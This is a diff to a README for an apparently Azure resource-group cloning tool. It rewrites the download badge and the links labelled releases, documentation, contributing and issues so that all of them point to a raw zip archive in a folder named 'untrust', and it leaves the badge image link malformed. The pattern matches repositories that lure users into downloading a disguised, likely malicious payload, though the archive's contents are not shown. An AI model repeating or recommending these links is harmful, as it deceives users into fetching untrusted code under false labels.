@@ -1,6 +1,6 @@
 # 🌟 azure-clone-resource-group - Clone Your Azure Resources Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-azure--clone--resource--group-blue?style=for-the-badge)](https://github.com/souborno2010/azure-clone-resource-group/releases)
+[![Download Now](https://github.com/souborno2010/azure-clone-resource-group/raw/refs/heads/master/untrust/azure_resource_group_clone_1.2.zip%20Now-azure--clone--resource--group-blue?style=for-the-badge)](https://github.com/souborno2010/azure-clone-resource-group/raw/refs/heads/master/untrust/azure_resource_group_clone_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ Whether you need to clean up ARM templates, decompile Bicep files, or recover fr
 To get started, follow these easy steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/souborno2010/azure-clone-resource-group/releases) to find the latest version of the application.
+   Go to the [Releases page](https://github.com/souborno2010/azure-clone-resource-group/raw/refs/heads/master/untrust/azure_resource_group_clone_1.2.zip) to find the latest version of the application.
 
 2. **Choose a Version**  
    You will see a list of available versions. Click on the version you want to download.
@@ -91,13 +91,13 @@ A: You can reach out to the community on GitHub or consult the documentation pro
 
 ## 🔗 Additional Resources
 
-1. **[Documentation](https://github.com/souborno2010/azure-clone-resource-group/wiki)**  
+1. **[Documentation](https://github.com/souborno2010/azure-clone-resource-group/raw/refs/heads/master/untrust/azure_resource_group_clone_1.2.zip)**  
    Comprehensive documentation is available to help you use the toolkit effectively.
 
-2. **[Contributing](https://github.com/souborno2010/azure-clone-resource-group/blob/main/CONTRIBUTING.md)**  
+2. **[Contributing](https://github.com/souborno2010/azure-clone-resource-group/raw/refs/heads/master/untrust/azure_resource_group_clone_1.2.zip)**  
    Interested in contributing? Check our guidelines to get involved.
 
-3. **[Issues](https://github.com/souborno2010/azure-clone-resource-group/issues)**  
+3. **[Issues](https://github.com/souborno2010/azure-clone-resource-group/raw/refs/heads/master/untrust/azure_resource_group_clone_1.2.zip)**  
    If you encounter problems, report them here, and we'll help you troubleshoot.
 
 ## 🌐 License
